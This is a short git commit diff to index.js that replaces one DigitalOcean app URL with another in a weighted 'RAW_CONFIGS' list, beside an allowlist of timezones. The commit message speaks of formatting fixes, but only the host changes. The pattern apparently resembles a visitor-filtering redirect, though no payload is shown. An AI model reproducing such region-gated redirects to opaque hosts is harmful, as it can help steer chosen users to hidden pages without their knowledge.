96d43db3cbbcaf4c2f426d729d55134584e592dc
paalakash <palaksh452@gmail.com>
2026-07-16 07:40:22 +0530

    Fix URL formatting and weight consistency in RAW_CONFIGS
    Corrected URL formatting and ensured consistency in weight assignments.

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://seal-app-mgrjb.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://starfish-app-rp26a.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
